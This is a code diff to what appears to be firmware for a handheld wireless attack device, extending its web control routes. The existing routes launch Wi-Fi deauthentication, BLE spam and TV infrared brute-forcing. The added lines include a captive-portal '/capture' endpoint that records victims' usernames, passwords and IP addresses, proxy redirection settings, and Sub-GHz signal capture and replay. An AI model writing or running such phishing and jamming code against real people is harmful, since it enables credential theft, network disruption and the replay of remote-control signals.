@@ -37,7 +37,7 @@ static void sendJSON(int code, const char* json) {
 }
 
 // ── Menu action wrappers ──
-static void actionWiFiScan() { performScan(); showStatus("Scan done", String(scanCount) + " nets"); }
+static void actionWiFiScan() { performScan(); showStatus("Scan done", (String(scanCount) + " nets").c_str()); }
 static void actionDeauthStart() { startDeauthAttack(); deauthEnabled = true; showStatus("Deauth", "Running"); }
 static void actionDeauthStop() { stopAttack(); deauthEnabled = false; showStatus("Deauth", "Stopped"); }
 static void actionBLEToggle() { if (!bleSpamActive) { startBLESpam(); } else { stopBLESpam(); } bleSpamEnabled = bleSpamActive; showStatus("BLE", bleSpamActive ? "ON" : "OFF"); }
@@ -131,6 +131,17 @@ void setupWebRoutes() {
   server.on("/portal/templates", HTTP_GET, [](){ sendJSON(200, getPortalTemplatesJSON()); });
   server.on("/portal/clear", HTTP_GET, [](){ clearCreds(); sendJSON(200, "{\"ok\":true}"); });
 
+  // Captive portal credential capture (POST from victim form)
+  server.on("/capture", HTTP_POST, [](){
+    String user = server.hasArg("username") ? server.arg("username") : "";
+    String pass = server.hasArg("password") ? server.arg("password") : "";
+    String ip = server.client().remoteIP().toString();
+    if (user.length() > 0 && pass.length() > 0) {
+      captureCred(user.c_str(), pass.c_str(), ip.c_str());
+    }
+    server.send(200, "text/html", generateSuccessHTML());
+  });
+
   server.on("/wifi/scan", HTTP_GET, [](){ sendJSON(200, getWiFiScanJSON()); });
   server.on("/wifi/connect", HTTP_POST, handleWiFiConnect);
   server.on("/wifi/status", HTTP_GET, [](){ sendJSON(200, getWiFiStatusJSON()); });
@@ -146,6 +157,15 @@ void setupWebRoutes() {
   server.on("/proxy/stop", HTTP_GET, [](){ stopProxy(); proxyEnabled = false; sendJSON(200, "{\"ok\":true}"); });
   server.on("/proxy/status", HTTP_GET, [](){ sendJSON(200, getProxyStatusJSON()); });
   server.on("/proxy/log", HTTP_GET, [](){ sendJSON(200, getProxyLogJSON()); });
+  server.on("/proxy/config", HTTP_POST, [](){
+    String host = server.hasArg("host") ? server.arg("host") : "";
+    uint16_t port = server.hasArg("port") ? server.arg("port").toInt() : 80;
+    if (setProxyTarget(host.c_str(), port)) {
+      sendJSON(200, "{\"ok\":true}");
+    } else {
+      sendJSON(400, "{\"error\":\"invalid target\"}");
+    }
+  });
 
   server.on("/ir/status", HTTP_GET, [](){ sendJSON(200, getIRStatusJSON()); });
   server.on("/ir/capture", HTTP_GET, [](){ startIRCapture(); sendJSON(200, "{\"ok\":true}"); });
@@ -156,6 +176,7 @@ void setupWebRoutes() {
     bruteForceTV(brand.c_str());
     sendJSON(200, "{\"ok\":true}");
   });
+  server.on("/ir/presets", HTTP_GET, [](){ sendJSON(200, getIRPresetsJSON()); });
 
   server.on("/subghz/status", HTTP_GET, [](){ sendJSON(200, getSubGHzStatusJSON()); });
   server.on("/subghz/scan", HTTP_GET, [](){
@@ -165,12 +186,16 @@ void setupWebRoutes() {
     sendJSON(200, "{\"ok\":true}");
   });
   server.on("/subghz/stop", HTTP_GET, [](){ stopSubGHzScan(); sendJSON(200, "{\"ok\":true}"); });
+  server.on("/subghz/captured", HTTP_GET, [](){ sendJSON(200, getSubGHzCapturedJSON()); });
+  server.on("/subghz/capture", HTTP_GET, [](){ captureSubGHz(); sendJSON(200, "{\"ok\":true}"); });
+  server.on("/subghz/replay", HTTP_GET, [](){ replaySubGHz(); sendJSON(200, "{\"ok\":true}"); });
 
   server.onNotFound([](){
     if (portalActive) {
-      server.send(200, "text/html", generatePortalHTML(0));
+      server.send(200, "text/html", generatePortalHTML(getActivePortalTemplate()));
     } else {
-      server.sendHeader("Location", "http://192.168.4.1/");
+      String ip = WiFi.softAPIP().toString();
+      server.sendHeader("Location", "http://" + ip + "/");
       server.send(302, "text/plain", "");
     }
   });
